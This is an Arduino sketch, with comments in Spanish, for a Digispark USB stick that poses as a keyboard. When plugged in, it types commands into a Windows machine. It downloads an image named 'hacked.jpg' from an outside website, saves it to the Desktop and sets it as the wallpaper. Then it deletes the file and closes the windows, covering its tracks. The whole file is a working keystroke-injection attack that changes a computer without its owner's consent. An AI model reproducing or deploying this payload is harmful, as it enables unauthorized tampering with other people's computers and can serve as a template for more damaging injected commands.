#include "DigiKeyboard.h"

void setup(){
  
}

void loop(){
#define KEY_Tab     43
#define KEY_DOWN_ARROW   0x51
DigiKeyboard.sendKeyStroke(0); 
DigiKeyboard.delay(3000);
  //Abre cmd
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.print("http>&&codingconcepts.biz&wp/content&uploads&2015&05&hacked.jpg");
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(2000);
  //Abre la ventana para guardar
DigiKeyboard.sendKeyStroke(KEY_S,MOD_CONTROL_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.print("%userprofile%");
DigiKeyboard.delay(1000);
  //Entra a la carpeta principal del usuario
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
  //Entra al escritorio
DigiKeyboard.print("Desktop");
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //Guarda la imagen como "JE"
DigiKeyboard.print("JE");
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
  //Ahora toca abrir la imagen
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.print("cmd");
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("cd");
DigiKeyboard.print(" ");
DigiKeyboard.print("Desktop");
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("JE.jpg");
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
  //Se navega hasta llegar a la opcion de "Establecer como fondo"
DigiKeyboard.sendKeyStroke(KEY_Tab);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_Tab);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_Tab);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_Tab);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_Tab);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_Tab);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_Tab);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_Tab);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT); 
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT); 
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT); 
DigiKeyboard.delay(1000);
  //Ahora toca eliminar la imagen
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.print("cmd");
DigiKeyboard.delay(100);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("cd");
DigiKeyboard.print(" ");
DigiKeyboard.print("%userprofile%");
DigiKeyboard.delay(100);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("cd");
DigiKeyboard.print(" ");
DigiKeyboard.print("Desktop");
DigiKeyboard.delay(100);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("del");
DigiKeyboard.print(" ");
DigiKeyboard.print("JE.jpg");
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT);
DigiKeyboard.delay(1000);
}

